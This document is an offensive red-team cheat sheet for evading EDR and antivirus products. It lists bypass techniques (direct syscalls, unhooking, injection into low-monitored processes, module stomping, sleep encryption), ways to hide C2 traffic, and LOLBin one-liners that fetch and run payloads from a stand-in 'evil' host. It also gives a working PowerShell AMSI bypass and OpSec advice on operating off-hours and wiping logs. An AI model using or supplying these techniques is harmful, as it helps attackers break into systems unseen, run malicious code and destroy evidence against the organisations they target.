# EDR/AV bypass and stealth ops cheat sheet

> Source: multiple red-team field summaries (2024-2026)
> Use: operations in EDR/AV-protected environments

---

## Detection layers and matching bypass

| Layer | What EDR does | Bypass idea |
|-------|---------------|-------------|
| Static signature | Match known-malware hash/features | Custom compile, encrypt payload, mutate features |
| User-mode hook | Hook ntdll.dll to watch APIs | Direct syscalls / unhooking / bring-your-own ntdll |
| Kernel callbacks | Register process/thread/image-load callbacks | Callback removal (needs a driver) / inject a legitimate process |
| ETW | Collect events via ETW | Patch EtwEventWrite / disable provider |
| Behavior analysis | Call sequences and behavior patterns | Delayed exec / split actions / mimic normal behavior |
| Memory scan | Periodic process-memory scan | Heap encrypt / encrypt payload while sleeping / module stomping |
| Network detect | Outbound traffic features | Domain fronting / legitimate-service tunnel / encrypt |

---

## Practical bypass techniques

### 1. Direct syscalls (bypass user-mode hooks)

```
Idea: skip ntdll.dll; call the kernel with syscall
Tools: SysWhispers3 / HellsGate / TartarusGate
Effect: bypass all user-mode hooks
```

### 2. Unhooking (restore original ntdll)

```
Method A: remap ntdll.dll from disk
Method B: load a clean copy from KnownDlls
Method C: copy .text from a suspended process
Effect: restore hooked APIs to original bytes
```

### 3. Process injection (pick low-monitor targets)

```
Preferred inject targets (low monitor):
- RuntimeBroker.exe
- sihost.exe
- taskhostw.exe
- explorer.exe (slightly higher risk)

Avoid:
- lsass.exe (heavily monitored)
- svchost.exe (some EDRs watch closely)
- powershell.exe / cmd.exe
```

### 4. Module stomping

```
Idea: write payload into .text of an already-loaded legitimate DLL
Effect: memory scan sees a legitimate module, not suspicious RWX
```

### 5. Sleep encryption (Ekko/Zilean)

```
Idea: encrypt own memory while the beacon sleeps
Effect: memory scan misses payload features
Impl: register a Timer callback; encrypt before sleep, decrypt on wake
```

### 6. Call-stack spoofing

```
Idea: forge the call stack so API calls look like they come from legit code
Effect: bypass call-stack-based behavior detect
```

---

## C2 traffic stealth

| Technique | Idea | Detect difficulty |
|-----------|------|-------------------|
| Domain fronting | HTTPS SNI and Host differ | High |
| Cloudflare Workers | Relay via CF; looks like normal HTTPS | High |
| Azure/AWS legitimate services | Cloud APIs as C2 channel | Very high |
| DNS over HTTPS | C2 data encoded in DNS queries | Medium |
| WebSocket | Long-lived; mixed into normal web traffic | Medium |
| ICMP tunnel | Data in ICMP packets | Low (easy to spot) |

---

## LOLBins (Living Off the Land)

Use built-in legitimate programs for malicious actions:

| Program | Use | Example |
|---------|-----|---------|
| certutil | Download file | `certutil -urlcache -split -f http://evil/payload.exe` |
| mshta | Run HTA | `mshta http://evil/payload.hta` |
| rundll32 | Load DLL | `rundll32 evil.dll,EntryPoint` |
| regsvr32 | Load SCT | `regsvr32 /s /n /u /i:http://evil/file.sct scrobj.dll` |
| wmic | Remote exec | `wmic /node:target process call create "cmd"` |
| msiexec | Install MSI | `msiexec /q /i http://evil/payload.msi` |
| bitsadmin | Download file | `bitsadmin /transfer job http://evil/payload.exe C:\payload.exe` |
| forfiles | Run command | `forfiles /p c:\windows /m notepad.exe /c "cmd /c calc.exe"` |

---

## AMSI bypass (PowerShell)

```powershell
# Classic patch (may be signature-detected)
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# Stealthier: reflectively patch AmsiScanBuffer
# or drop PowerShell to v2 (no AMSI)
powershell -version 2
```

---

## OpSec principles

1. **Minimum action** — do not touch what you can skip; reuse existing creds instead of creating new ones
2. **Time window** — operate off-hours (lower chance of human review)
3. **Blend traffic** — C2 frequency and size mimic normal business traffic
4. **No disk** — execute in memory; wipe when done
5. **Log awareness** — know which actions produce which logs; evade or clean after
6. **Honeypot ID** — identify honeypots first (oddly open services, too-juicy creds)
7. **Stagger** — do not finish every step in one burst; spread across time windows
